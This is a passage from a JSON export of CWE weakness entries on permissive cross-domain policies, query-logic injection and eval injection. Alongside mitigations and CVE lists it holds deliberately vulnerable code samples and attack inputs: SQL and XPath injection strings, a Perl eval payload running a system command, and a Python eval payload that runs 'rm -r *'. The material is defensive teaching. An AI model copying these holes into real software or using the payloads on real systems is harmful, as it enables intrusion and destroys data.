server that is outside of Replit's control and the token used to connect to the Repl could be obtained by an attacker, leading to full compromise of that Repl (not of the account). This was patched in version 7.3.1 by updating the address of the fallback WebSocket polling proxy to the new one. As a workaround, a user may specify the new address for the polling host (`gp-v2.replit.com`) in the `ConnectArgs`. More information about this workaround is available in the GitHub Security Advisory."}, {"Reference": "CVE-2022-21673", "Description": "Grafana is an open-source platform for monitoring and observability. In affected versions when a data source has the Forward OAuth Identity feature enabled, sending a query to that datasource with an API token (and no other user credentials) will forward the OAuth Identity of the most recently logged-in user. This can allow API token holders to retrieve data for which they may not have intended access. This attack relies on the Grafana instance having data sources that support the Forward OAuth Identity feature, the Grafana instance having a data source with the Forward OAuth Identity feature toggled on, the Grafana instance having OAuth enabled, and the Grafana instance having usable API keys. This issue has been patched in versions 7.5.13 and 8.3.4."}]}
{"ID": "942", "Name": "Permissive Cross-domain Policy with Untrusted Domains", "Abstraction": "Variant", "Structure": "Simple", "Status": "Incomplete", "Description": "The product uses a cross-domain policy file that includes domains that should not be trusted.", "ExtendedDescription": "\n\nA cross-domain policy file (\"crossdomain.xml\" in Flash and \"clientaccesspolicy.xml\" in Silverlight) defines a list of domains from which a server is allowed to make cross-domain requests. When making a cross-domain request, the Flash or Silverlight client will first look for the policy file on the target server. If it is found, and the domain hosting the application is explicitly allowed to make requests, the request is made.\n\n\nTherefore, if a cross-domain policy file includes domains that should not be trusted, such as when using wildcards, then the application could be attacked by these untrusted domains.\n\n\nAn overly permissive policy file allows many of the same attacks seen in Cross-Site Scripting (CWE-79). Once the user has executed a malicious Flash or Silverlight application, they are vulnerable to a variety of attacks. The attacker could transfer private information, such as cookies that may include session information, from the victim's machine to the attacker. The attacker could send malicious requests to a web site on behalf of the victim, which could be especially dangerous to the site if the victim has administrator privileges to manage that site.\n\n\nIn many cases, the attack can be launched without the victim even being aware of it.\n", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "863", "ViewID": "1000", "Ordinal": "Primary"}, {"Nature": "ChildOf", "CweID": "923", "ViewID": "1000"}, {"Nature": "ChildOf", "CweID": "183", "ViewID": "1000"}, {"Nature": "CanPrecede", "CweID": "668", "ViewID": "1000"}], "ApplicablePlatforms": [{"Type": "Language", "Class": "Not Language-Specific", "Prevalence": "Undetermined"}, {"Type": "Technology", "Class": "Web Based", "Prevalence": "Undetermined"}], "ModesOfIntroduction": [{"Phase": "Implementation"}, {"Phase": "Architecture and Design", "Note": "COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic."}], "CommonConsequences": [{"Scope": ["Confidentiality", "Integrity", "Availability", "Access Control"], "Impact": ["Execute Unauthorized Code or Commands", "Bypass Protection Mechanism", "Read Application Data", "Varies by Context"], "Note": "An attacker may be able to bypass the web browser's same-origin policy. An attacker can exploit the weakness to manipulate or steal cookies, create requests that can be mistaken for those of a valid user, compromise confidential information, or execute malicious code on the end user systems for a variety of nefarious purposes. Other damaging attacks include the disclosure of end user files, installation of Trojan horse programs, redirecting the user to some other page or site, running ActiveX controls (under Microsoft Internet Explorer) from sites that a user perceives as trustworthy, and modifying presentation of content."}], "DetectionMethods": [{"DetectionMethodID": "DM-14", "Method": "Automated Static Analysis", "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)", "Effectiveness": "High"}], "PotentialMitigations": [{"Phase": ["Architecture and Design"], "Strategy": "Attack Surface Reduction", "Description": "Avoid using wildcards in the cross-domain policy file. Any domain matching the wildcard expression will be implicitly trusted, and can perform two-way interaction with the target server."}, {"Phase": ["Architecture and Design", "Operation"], "Strategy": "Environment Hardening", "Description": "For Flash, modify crossdomain.xml to use meta-policy options such as 'master-only' or 'none' to reduce the possibility of an attacker planting extraneous cross-domain policy files on a server."}, {"Phase": ["Architecture and Design", "Operation"], "Strategy": "Attack Surface Reduction", "Description": "For Flash, modify crossdomain.xml to use meta-policy options such as 'master-only' or 'none' to reduce the possibility of an attacker planting extraneous cross-domain policy files on a server."}], "DemonstrativeExamples": [{"ID": "DX-208", "Entries": [{"IntroText": "These cross-domain policy files mean to allow Flash and Silverlight applications hosted on other domains to access its data:"}, {"BodyText": "Flash crossdomain.xml :"}, {"Nature": "Bad", "Language": "XML", "ExampleCode": "```\n\t<cross-domain-policy xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n\txsi:noNamespaceSchemaLocation=\"http://www.adobe.com/xml/schemas/PolicyFile.xsd\">\n\t<allow-access-from domain=\"*.example.com\"/>\n\t<allow-access-from domain=\"*\"/>\n\t</cross-domain-policy>\n```"}, {"BodyText": "Silverlight clientaccesspolicy.xml :"}, {"Nature": "Bad", "Language": "XML", "ExampleCode": "```\n\t<?xml version=\"1.0\" encoding=\"utf-8\"?>\n\t<access-policy>\n\t<cross-domain-access>\n\t<policy>\n\t<allow-from http-request-headers=\"SOAPAction\">\n\t<domain uri=\"*\"/>\n\t</allow-from>\n\t<grant-to>\n\t<resource path=\"/\" include-subpaths=\"true\"/>\n\t</grant-to>\n\t</policy>\n\t</cross-domain-access>\n\t</access-policy>\n```"}, {"BodyText": "These entries are far too permissive, allowing any Flash or Silverlight application to send requests. A malicious application hosted on any other web site will be able to send requests on behalf of any user tricked into executing it."}]}], "ObservedExamples": [{"Reference": "CVE-2012-2292", "Description": "Product has a Silverlight cross-domain policy that does not restrict access to another application, which allows remote attackers to bypass the Same Origin Policy.", "Link": "https://www.cve.org/CVERecord?id=CVE-2012-2292"}, {"Reference": "CVE-2014-2049", "Description": "The default Flash Cross Domain policies in a product allows remote attackers to access user files.", "Link": "https://www.cve.org/CVERecord?id=CVE-2014-2049"}, {"Reference": "CVE-2007-6243", "Description": "Chain: Adobe Flash Player does not sufficiently restrict the interpretation and usage of cross-domain policy files, which makes it easier for remote attackers to conduct cross-domain and cross-site scripting (XSS) attacks.", "Link": "https://www.cve.org/CVERecord?id=CVE-2007-6243"}, {"Reference": "CVE-2008-4822", "Description": "Chain: Adobe Flash Player and earlier does not properly interpret policy files, which allows remote attackers to bypass a non-root domain policy.", "Link": "https://www.cve.org/CVERecord?id=CVE-2008-4822"}, {"Reference": "CVE-2010-3636", "Description": "Chain: Adobe Flash Player does not properly handle unspecified encodings during the parsing of a cross-domain policy file, which allows remote web servers to bypass intended access restrictions via unknown vectors.", "Link": "https://www.cve.org/CVERecord?id=CVE-2010-3636"}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}}
{"ID": "943", "Name": "Improper Neutralization of Special Elements in Data Query Logic", "Abstraction": "Class", "Structure": "Simple", "Status": "Incomplete", "Description": "The product generates a query intended to access or manipulate data in a data store such as a database, but it does not neutralize or incorrectly neutralizes special elements that can modify the intended logic of the query.", "ExtendedDescription": "\n\nDepending on the capabilities of the query language, an attacker could inject additional logic into the query to:\n\n\n  - Modify the intended selection criteria, thus changing which data entities (e.g., records) are returned, modified, or otherwise manipulated\n\n  - Append additional commands to the query\n\n  - Return more entities than intended\n\n  - Return fewer entities than intended\n\n  - Cause entities to be sorted in an unexpected way\n\nThe ability to execute additional commands or change which entities are returned has obvious risks. But when the product logic depends on the order or number of entities, this can also lead to vulnerabilities. For example, if the query expects to return only one entity that specifies an administrative user, but an attacker can change which entities are returned, this could cause the logic to return information for a regular user and incorrectly assume that the user has administrative privileges.\n\nWhile this weakness is most commonly associated with SQL injection, there are many other query languages that are also subject to injection attacks, including HTSQL, LDAP, DQL, XQuery, Xpath, and \"NoSQL\" languages.\n", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "74", "ViewID": "1000", "Ordinal": "Primary"}], "ApplicablePlatforms": [{"Type": "Language", "Class": "Not Language-Specific", "Prevalence": "Undetermined"}], "ModesOfIntroduction": [{"Phase": "Implementation", "Note": "REALIZATION: This weakness is caused during implementation of an architectural security tactic."}], "CommonConsequences": [{"Scope": ["Confidentiality", "Integrity", "Availability", "Access Control"], "Impact": ["Bypass Protection Mechanism", "Read Application Data", "Modify Application Data", "Varies by Context"]}], "DetectionMethods": [{"DetectionMethodID": "DM-14", "Method": "Automated Static Analysis", "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)", "Effectiveness": "High"}], "DemonstrativeExamples": [{"ID": "DX-209", "Entries": [{"IntroText": "The following code dynamically constructs and executes a SQL query that searches for items matching a specified name. The query restricts the items displayed to those where owner matches the user name of the currently-authenticated user."}, {"Nature": "Bad", "Language": "C#", "ExampleCode": "```\n\t...\n\tstring userName = ctx.getAuthenticatedUserName();\n\tstring query = \"SELECT * FROM items WHERE owner = '\" + userName + \"' AND itemname = '\" + ItemName.Text + \"'\";\n\tsda = new SqlDataAdapter(query, conn);\n\tDataTable dt = new DataTable();\n\tsda.Fill(dt);\n\t...\n```"}, {"BodyText": "The query that this code intends to execute follows:"}, {"Nature": "Informative", "ExampleCode": "```\n\tSELECT * FROM items WHERE owner = <userName> AND itemname = <itemName>;\n```"}, {"BodyText": "However, because the query is constructed dynamically by concatenating a constant base query string and a user input string, the query only behaves correctly if itemName does not contain a single-quote character. If an attacker with the user name wiley enters the string:"}, {"Nature": "Attack", "ExampleCode": "```\n\tname' OR 'a'='a\n```"}, {"BodyText": "for itemName, then the query becomes the following:"}, {"Nature": "Attack", "ExampleCode": "```\n\tSELECT * FROM items WHERE owner = 'wiley' AND itemname = 'name' OR 'a'='a';\n```"}, {"BodyText": "The addition of the:"}, {"Nature": "Attack", "ExampleCode": "```\n\tOR 'a'='a\n```"}, {"BodyText": "condition causes the WHERE clause to always evaluate to true, so the query becomes logically equivalent to the much simpler query:"}, {"Nature": "Attack", "ExampleCode": "```\n\tSELECT * FROM items;\n```"}, {"BodyText": "This simplification of the query allows the attacker to bypass the requirement that the query only return items owned by the authenticated user; the query now returns all entries stored in the items table, regardless of their specified owner."}]}, {"ID": "DX-210", "Entries": [{"IntroText": "The code below constructs an LDAP query using user input address data:"}, {"Nature": "Bad", "Language": "Java", "ExampleCode": "```\n\tcontext = new InitialDirContext(env);\n\tString searchFilter = \"StreetAddress=\" + address;\n\tNamingEnumeration answer = context.search(searchBase, searchFilter, searchCtls);\n```"}, {"BodyText": "Because the code fails to neutralize the address string used to construct the query, an attacker can supply an address that includes additional LDAP queries."}]}, {"ID": "DX-211", "Entries": [{"IntroText": "Consider the following simple XML document that stores authentication information and a snippet of Java code that uses XPath query to retrieve authentication information:"}, {"Nature": "Informative", "Language": "XML", "ExampleCode": "```\n\t<users>\n\t\t<user>\n\t\t\t<login>john</login>\n\t\t\t<password>abracadabra</password>\n\t\t\t<home_dir>/home/john</home_dir>\n\t\t</user>\n\t\t<user>\n\t\t\t<login>cbc</login>\n\t\t\t<password>1mgr8</password>\n\t\t\t<home_dir>/home/cbc</home_dir>\n\t\t</user>\n\t</users>\n```"}, {"BodyText": "The Java code used to retrieve the home directory based on the provided credentials is:"}, {"Nature": "Bad", "Language": "Java", "ExampleCode": "```\n\tXPath xpath = XPathFactory.newInstance().newXPath();\n\tXPathExpression xlogin = xpath.compile(\"//users/user[login/text()='\" + login.getUserName() + \"' and password/text() = '\" + login.getPassword() + \"']/home_dir/text()\");\n\tDocument d = DocumentBuilderFactory.newInstance().newDocumentBuilder().parse(new File(\"db.xml\"));\n\tString homedir = xlogin.evaluate(d);\n```"}, {"BodyText": "Assume that user \"john\" wishes to leverage XPath Injection and login without a valid password. By providing a username \"john\" and password \"' or ''='\" the XPath expression now becomes"}, {"Nature": "Attack", "ExampleCode": "```\n\t//users/user[login/text()='john' or ''='' and password/text() = '' or ''='']/home_dir/text()\n```"}, {"BodyText": "This lets user \"john\" login without a valid password, thus bypassing authentication."}]}], "ObservedExamples": [{"Reference": "CVE-2014-2503", "Description": "Injection using Documentum Query Language (DQL)", "Link": "https://www.cve.org/CVERecord?id=CVE-2014-2503"}, {"Reference": "CVE-2014-2508", "Description": "Injection using Documentum Query Language (DQL)", "Link": "https://www.cve.org/CVERecord?id=CVE-2014-2508"}], "RelatedAttackPatterns": ["676"], "MappingNotes": {"Usage": "Allowed-with-Review", "Rationale": "This CWE entry is a Class and might have Base-level children that would be more appropriate", "Comments": "Examine children of this entry to see if there is a better fit", "Reasons": ["Abstraction"]}, "Notes": [{"Type": "Relationship", "Note": "It could be argued that data query languages are effectively a command language - albeit with a limited set of commands - and thus any query-language injection issue could be treated as a child of CWE-74. However, CWE-943 is intended to better organize query-oriented issues to separate them from fully-functioning programming languages, and also to provide a more precise identifier for the many query languages that do not have their own CWE identifier."}], "Top25Examples": [{"Reference": "CVE-2022-35246", "Description": "A NoSQL-Injection information disclosure vulnerability vulnerability exists in Rocket.Chat <v5, <v4.8.2 and <v4.7.5 in the getS3FileUrl Meteor server method that can disclose arbitrary file upload URLs to users that should not be able to access."}, {"Reference": "CVE-2022-36084", "Description": "cruddl is software for creating a GraphQL API for a database, using the GraphQL SDL to model a schema. If cruddl starting with version 1.1.0 and prior to versions 2.7.0 and 3.0.2 is used to generate a schema that uses `@flexSearchFulltext`, users of that schema may be able to inject arbitrary AQL queries that will be forwarded to and executed by ArangoDB. Schemas that do not use `@flexSearchFulltext` are not affected. The attacker needs to have `READ` permission to at least one root entity type that has `@flexSearchFulltext` enabled. The issue has been fixed in version 3.0.2 and in version 2.7.0 of cruddl. As a workaround, users can temporarily remove `@flexSearchFulltext` from their schemas."}, {"Reference": "CVE-2022-47909", "Description": "Livestatus Query Language (LQL) injection in the AuthUser HTTP query header of Tribe29's Checkmk <= 2.1.0p11, Checkmk <= 2.0.0p28, and all versions of Checkmk 1.6.0 (EOL) allows an attacker to perform direct queries to the application's core from localhost."}, {"Reference": "CVE-2022-32228", "Description": "An information disclosure vulnerability exists in Rocket.Chat <v5, <v4.8.2 and <v4.7.5 since the getReadReceipts Meteor server method does not properly filter user inputs that are passed to MongoDB queries, allowing $regex queries to enumerate arbitrary Message IDs."}, {"Reference": "CVE-2022-32229", "Description": "A information disclosure vulnerability exists in Rockert.Chat <v5 due to /api/v1/chat.getThreadsList lack of sanitization of user inputs and can therefore leak private thread messages to unauthorized users via Mongo DB injection."}]}
{"ID": "95", "Name": "Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection')", "Abstraction": "Variant", "Structure": "Simple", "Status": "Incomplete", "Description": "The product receives input from an upstream component, but it does not neutralize or incorrectly neutralizes code syntax before using the input in a dynamic evaluation call (e.g. \"eval\").", "ExtendedDescription": "This may allow an attacker to execute arbitrary code, or at least modify what code can be executed.", "LikelihoodOfExploit": "Medium", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "94", "ViewID": "1000", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Primary"}], "ApplicablePlatforms": [{"Type": "Language", "Name": "Java", "Prevalence": "Undetermined"}, {"Type": "Language", "Name": "JavaScript", "Prevalence": "Undetermined"}, {"Type": "Language", "Name": "Python", "Prevalence": "Undetermined"}, {"Type": "Language", "Name": "Perl", "Prevalence": "Undetermined"}, {"Type": "Language", "Name": "PHP", "Prevalence": "Undetermined"}, {"Type": "Language", "Name": "Ruby", "Prevalence": "Undetermined"}, {"Type": "Language", "Class": "Interpreted", "Prevalence": "Undetermined"}, {"Type": "Technology", "Name": "AI/ML", "Prevalence": "Undetermined"}], "ModesOfIntroduction": [{"Phase": "Implementation", "Note": "REALIZATION: This weakness is caused during implementation of an architectural security tactic."}, {"Phase": "Implementation", "Note": "This weakness is prevalent in handler/dispatch procedures that might want to invoke a large number of functions, or set a large number of variables."}], "CommonConsequences": [{"Scope": ["Confidentiality"], "Impact": ["Read Files or Directories", "Read Application Data"], "Note": "The injected code could access restricted data / files."}, {"Scope": ["Access Control"], "Impact": ["Bypass Protection Mechanism"], "Note": "In some cases, injectable code controls authentication; this may lead to a remote vulnerability."}, {"Scope": ["Access Control"], "Impact": ["Gain Privileges or Assume Identity"], "Note": "Injected code can access resources that the attacker is directly prevented from accessing."}, {"Scope": ["Integrity", "Confidentiality", "Availability", "Other"], "Impact": ["Execute Unauthorized Code or Commands"], "Note": "Code injection attacks can lead to loss of data integrity in nearly all cases as the control-plane data injected is always incidental to data recall or writing. Additionally, code injection can often result in the execution of arbitrary code."}, {"Scope": ["Non-Repudiation"], "Impact": ["Hide Activities"], "Note": "Often the actions performed by injected control code are unlogged."}], "DetectionMethods": [{"DetectionMethodID": "DM-14", "Method": "Automated Static Analysis", "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)", "Effectiveness": "High"}], "PotentialMitigations": [{"Phase": ["Architecture and Design", "Implementation"], "Description": "If possible, refactor your code so that it does not need to use eval() at all."}, {"MitigationID": "MIT-5", "Phase": ["Implementation"], "Strategy": "Input Validation", "Description": "\n\nAssume all input is malicious. Use an \"accept known good\" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.\n\n\nWhen performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, \"boat\" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as \"red\" or \"blue.\"\n\n\nDo not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.\n"}, {"Phase": ["Implementation"], "Description": "\n\nInputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180, CWE-181). Make sure that your application does not inadvertently decode the same input twice (CWE-174). Such errors could be used to bypass allowlist schemes by introducing dangerous inputs after they have been checked. Use libraries such as the OWASP ESAPI Canonicalization control.\n\n\nConsider performing repeated canonicalization until your input does not change any more. This will avoid double-decoding and similar scenarios, but it might inadvertently modify inputs that are allowed to contain properly-encoded dangerous content.\n"}, {"Phase": ["Implementation"], "Description": "\n\nFor Python programs, it is frequently encouraged to use the ast.literal_eval() function instead of eval, since it is intentionally designed to avoid executing code. However, an adversary could still cause excessive memory or stack consumption via deeply nested structures [REF-1372], so the python documentation discourages use of ast.literal_eval() on untrusted data [REF-1373].\n", "Effectiveness": "Discouraged Common Practice"}], "DemonstrativeExamples": [{"ID": "DX-31", "Entries": [{"IntroText": "edit-config.pl: This CGI script is used to modify settings in a configuration file."}, {"Nature": "Bad", "Language": "Perl", "ExampleCode": "```\n\tuse CGI qw(:standard);\n\tsub config_file_add_key {\n\t\t\tmy ($fname, $key, $arg) = @_;\n```\n# code to add a field/key to a file goes here* \n\t\t\t}\n\t\n\tsub config_file_set_key {\n\t```\n\t\t\tmy ($fname, $key, $arg) = @_;\n```\n# code to set key to a particular file goes here* \n\t\t\t}\n\t\n\tsub config_file_delete_key {\n\t```\n\t\t\tmy ($fname, $key, $arg) = @_;\n```\n# code to delete key from a particular file goes here* \n\t\t\t}\n\t\n\tsub handleConfigAction {\n\t```\n\t\t\tmy ($fname, $action) = @_;\n\t\t\tmy $key = param('key');\n\t\t\tmy $val = param('val');\n```\n# this is super-efficient code, especially if you have to invoke* \n\t\t\t\n\t\t\t *# any one of dozens of different functions!* \n\t\t\t\n\t\t\tmy $code = \"config_file_$action_key(\\$fname, \\$key, \\$val);\";\n\t\t\teval($code);}\n\t\n\t$configfile = \"/home/cwe/config.txt\";\n\tprint header;\n\tif (defined(param('action'))) {\n\t```\n\t\thandleConfigAction($configfile, param('action'));\n\t}\n\telse {\n\t\tprint \"No action specified!\\n\";\n\t}\n```"}, {"BodyText": "The script intends to take the 'action' parameter and invoke one of a variety of functions based on the value of that parameter - config_file_add_key(), config_file_set_key(), or config_file_delete_key(). It could set up a conditional to invoke each function separately, but eval() is a powerful way of doing the same thing in fewer lines of code, especially when a large number of functions or variables are involved. Unfortunately, in this case, the attacker can provide other values in the action parameter, such as:"}, {"Nature": "Attack", "ExampleCode": "```\n\tadd_key(\",\",\"); system(\"/bin/ls\");\n```"}, {"BodyText": "This would produce the following string in handleConfigAction():"}, {"Nature": "Result", "ExampleCode": "```\n\tconfig_file_add_key(\",\",\"); system(\"/bin/ls\");\n```"}, {"BodyText": "Any arbitrary Perl code could be added after the attacker has \"closed off\" the construction of the original function call, in order to prevent parsing errors from causing the malicious eval() to fail before the attacker's payload is activated. This particular manipulation would fail after the system() call, because the \"_key(\\$fname, \\$key, \\$val)\" portion of the string would cause an error, but this is irrelevant to the attack because the payload has already been activated."}]}, {"ID": "DX-156", "Entries": [{"IntroText": "This simple script asks a user to supply a list of numbers as input and adds them together."}, {"Nature": "Bad", "Language": "Python", "ExampleCode": "```\n\t def main():\n\t\t sum = 0\n\t\t numbers = eval(input(\"Enter a space-separated list of numbers: \"))\n\t\t for num in numbers:\n\t\t\t sum = sum + num\n\t\t print(f\"Sum of {numbers} = {sum}\") \n\t main() \n```"}, {"BodyText": "The eval() function can take the user-supplied list and convert it into a Python list object, therefore allowing the programmer to use list comprehension methods to work with the data. However, if code is supplied to the eval() function, it will execute that code. For example, a malicious user could supply the following string:"}, {"Nature": "Attack", "ExampleCode": "```\n\t__import__('subprocess').getoutput('rm -r *')\n```"}, {"BodyText": "This would delete all the files in the current directory. For this reason, it is not recommended to use eval() with untrusted input."}, {"BodyText": "A way to accomplish this without the use of eval() is to apply an integer conversion on the input within a try/except block. If the user-supplied input is not numeric, this will raise a ValueError. By avoiding eval(), there is no opportunity for the input string to be executed as code."}, {"Nature": "Good", "Language": "Python", "ExampleCode": "```\n\t def main():\n\t\t sum = 0\n\t\t numbers = input(\"Enter a space-separated list of numbers: \").split(\" \")\n\t\t try:\n\t\t\t for num in numbers:\n\t\t\t\t sum = sum + int(num)\n\t\t\t print(f\"Sum of {numbers} = {sum}\") \n\t\t except ValueError:\n\t\t\t print(\"Error: invalid input\")\n\t main() \n```"}, {"BodyText": "An alternative, commonly-cited mitigation for this kind of weakness is to use the ast.literal_eval() function, since it is intentionally designed to avoid executing code. However, an adversary could still cause excessive memory or stack consumption via deeply nested structures [REF-1372], so the python documentation discourages use of ast.literal_eval() on untrusted data [REF-1373]."}]}], "ObservedExamples": [{"Reference": "CVE-2024-4181", "Description": "Framework for LLM applications allows eval injection via a crafted response from a hosting provider.", "Link": "https://www.cve.org/CVERecord?id=CVE-2024-4181"}, {"Reference": "CVE-2022-2054", "Description": "Python compiler uses eval() to execute malicious strings as Python code.", "Link": "https://www.cve.org/CVERecord?id=CVE-2022-2054"}, {"Reference": "CVE-2021-22204", "Description": "Chain: regex in EXIF processor code does not correctly determine where a string ends (CWE-625), enabling eval injection (CWE-95), as exploited in the wild per CISA KEV.", "Link": "https://www.cve.org/CVERecord?id=CVE-2021-22204"}, {"Reference": "CVE-2021-22205", "Description": "Chain: backslash followed by a newline can bypass a validation step (CWE-20), leading to eval injection (CWE-95), as exploited in the wild per CISA KEV.", "Link": "https://www.cve.org/CVERecord?id=CVE-2021-22205"}, {"Reference": "CVE-2008-5071", "Description": "Eval injection in PHP program.", "Link": "https://www.cve.org/CVERecord?id=CVE-2008-5071"}, {"Reference": "CVE-2002-1750", "Description": "Eval injection in Perl program.", "Link": "https://www.cve.org/CVERecord?id=CVE-2002-1750"}, {"Reference": "CVE-2008-5305", "Description": "Eval injection in Perl program using an ID that should only contain hyphens and numbers.", "Link": "https://www.cve.org/CVERecord?id=CVE-2008-5305"}, {"Reference": "CVE-2002-1752", "Description": "Direct code injection into Perl eval function.", "Link": "https://www.cve.org/CVERecord?id=CVE-2002-1752"}, {"Reference": "CVE-2002-1753", "Description": "Eval injection in Perl program.", "Link": "https://www.cve.org/CVERecord?id=CVE-2002-1753"}, {"Reference": "CVE-2005-1527", "Description": "Direct code injection into Perl eval function.", "Link": "https://www.cve.org/CVERecord?id=CVE-2005-1527"}, {"Reference": "CVE-2005-2837", "Description": "Direct code injection into Perl eval function.", "Link": "https://www.cve.org/CVERecord?id=CVE-2005-2837"}, {"Reference": "CVE-2005-1921", "Description": "MFV. code injection into PHP eval statement using nested constructs that should not be nested.", "Link": "https://www.cve.org/CVERecord?id=CVE-2005-1921"}, {"Reference": "CVE-2005-2498", "Description": "MFV. code injection into PHP eval statement using nested constructs that should not be nested.", "Link": "https://www.cve.org/CVERecord?id=CVE-2005-2498"}, {"Reference": "CVE-2005-3302", "Description": "Code injection into Python eval statement from a field in a formatted file.", "Link": "https://www.cve.org/CVERecord?id=CVE-2005-3302"}, {"Reference": "CVE-2007-1253", "Description": "Eval injection in Python program.", "Link": "https://www.cve.org/CVERecord?id=CVE-2007-1253"}, {"Reference": "CVE-2001-1471", "Description": "chain: Resultant eval injection. An invalid value prevents initialization of variables, which can be modified by attacker and later injected into PHP eval statement.", "Link": "https://www.cve.org/CVERecord?id=CVE-2001-1471"}, {"Reference": "CVE-2007-2713", "Description": "Chain: Execution after redirect triggers eval injection.", "Link": "https://www.cve.org/CVERecord?id=CVE-2007-2713"}], "RelatedAttackPatterns": ["35"], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}, "Notes": [{"Type": "Other", "Note": "Factors: special character errors can play a role in increasing the variety of code that can be injected, although some vulnerabilities do not require special characters at all, e.g. when a single function without arguments can be referenced and a terminator character is not necessary."}], "Top25Examples": [{"Reference": "CVE-2021-23277", "Description": "Eaton Intelligent Power Manager (IPM) prior to 1.69 is vulnerable to unauthenticated eval injection vulnerability. The software does not neutralize code syntax from users before using in the dynamic evaluation call in loadUserFile function under scripts/libs/utils.js. Successful exploitation can allow attackers to control the input to the function and execute attacker controlled commands."}, {"Reference": "CVE-2022-40871", "Description": "Dolibarr ERP & CRM <=15.0.3 is vulnerable to Eval injection. By default, any administrator can be added to the installation page of dolibarr, and if successfully added, malicious code can be inserted into the database and then execute it by eval."}, {"Reference": "CVE-2021-22205", "Description": "An issue has been discovered in GitLab CE/EE affecting all versions starting from 11.9. GitLab was not properly validating image files that were passed to a file parser which resulted in a remote command execution."}, {"Reference": "CVE-2021-22204", "Description": "Improper neutralization of user data in the DjVu file format in ExifTool versions 7.44 and up allows arbitrary code execution when parsing the malicious image"}, {"Reference": "CVE-2022-41934", "Description": "XWiki Platform is a generic wiki platform offering runtime services for applications built on top of it. Any user with view rights on commonly accessible documents including the menu macro can execute arbitrary Groovy, Python or Velocity code in XWiki leading to full access to the XWiki installation due to improper escaping of the macro content and parameters of the menu macro. The problem has been patched in XWiki 14.6RC1, 13.10.8 and 14.4.3. The patch (commit `2fc20891`) for the document `Menu.MenuMacro` can be manually applied or a XAR archive of a patched version can be imported. The menu macro was basically unchanged since XWiki 11.6 so on XWiki 11.6 or later the patch for version of 13.10.8 (commit `59ccca24a`) can most likely be applied, on XWiki version 14.0 and later the versions in XWiki 14.6 and 14.4.3 should be appropriate."}, {"Reference": "CVE-2022-0819", "Description": "Code Injection in GitHub repository dolibarr/dolibarr prior to 15.0.1."}, {"Reference": "CVE-2022-0845", "Description": "Code Injection in GitHub repository pytorchlightning/pytorch-lightning prior to 1.6.0."}, {"Reference": "CVE-2022-24734", "Description": "MyBB is a free and open source forum software. In affected versions the Admin CP's Settings management module does not validate setting types correctly on insertion and update, making it possible to add settings of supported type `php` with PHP code, executed on on _Change Settings_ pages. This results in a Remote Code Execution (RCE) vulnerability. The vulnerable module requires Admin CP access with the `Can manage settings?` permission. MyBB's Settings module, which allows administrators to add, edit, and delete non-default settings, stores setting data in an options code string ($options_code; mybb_settings.optionscode database column) that identifies the setting type and its options, separated by a new line character (\\\\n). In MyBB 1.2.0, support for setting type php was added, for which the remaining part of the options code is PHP code executed on Change Settings pages (reserved for plugins and internal use). MyBB 1.8.30 resolves this issue. There are no known workarounds."}, {"Reference": "CVE-2022-28960", "Description": "A PHP injection vulnerability in Spip before v3.2.8 allows attackers to execute arbitrary PHP code via the _oups parameter at /ecrire."}, {"Reference": "CVE-2022-29216", "Description": "TensorFlow is an open source platform for machine learning. Prior to versions 2.9.0, 2.8.1, 2.7.2, and 2.6.4, TensorFlow's `saved_model_cli` tool is vulnerable to a code injection. This can be used to open a reverse shell. This code path was maintained for compatibility reasons as the maintainers had several test cases where numpy expressions were used as arguments. However, given that the tool is always run manually, the impact of this is still not severe. The maintainers have now removed the `safe=False` argument, so all parsing is done without calling `eval`. The patch is available in versions 2.9.0, 2.8.1, 2.7.2, and 2.6.4."}, {"Reference": "CVE-2022-32417", "Description": "PbootCMS v3.1.2 was discovered to contain a remote code execution (RCE) vulnerability via the function parserIfLabel at function.php."}, {"Reference": "CVE-2022-3394", "Description": "The WP All Export Pro WordPress plugin before 1.7.9 does not limit some functionality during exports only to users with the Administrator role, allowing any logged in user which has been given privileges to perform exports to execute arbitrary code on the site. By default only 